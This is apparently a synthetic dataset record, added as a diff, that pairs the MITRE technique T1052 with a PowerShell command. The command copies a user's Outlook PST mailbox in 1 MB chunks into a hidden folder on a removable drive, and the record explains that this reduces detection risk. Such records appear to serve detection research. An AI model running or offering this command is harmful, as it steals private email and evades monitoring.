@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\.sys\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h $dest; $src=(Get-ChildItem \"$env:USERPROFILE\\Documents\\Outlook Files\\*.pst\" -ErrorAction SilentlyContinue | Select -First 1); if($src){ $bytes=[IO.File]::ReadAllBytes($src.FullName); for($i=0;$i -lt $bytes.Length;$i+=1048576){ $e=[Math]::Min($i+1048575,$bytes.Length-1); $chunk=$bytes[$i..$e]; [IO.File]::WriteAllBytes((Join-Path $dest (\"chunk_{0:D8}.bin\" -f $i)),$chunk) } ; Write-Output (\"Chunked {0} into {1}\" -f $src.FullName,$dest) | Out-File \"$dest\\op.log\" -Append }",
+  "explanation": "Splits a PST file into 1 MB chunks and writes them to a hidden folder on a removable drive to reduce detection risk and throttle I/O.",
+  "rationale_steps": [
+    "Select removable drive and hide a staging directory",
+    "Locate a PST file for extraction",
+    "Write file data in small chunks directly to USB",
+    "Record a local log message using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-3ebce6ce",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
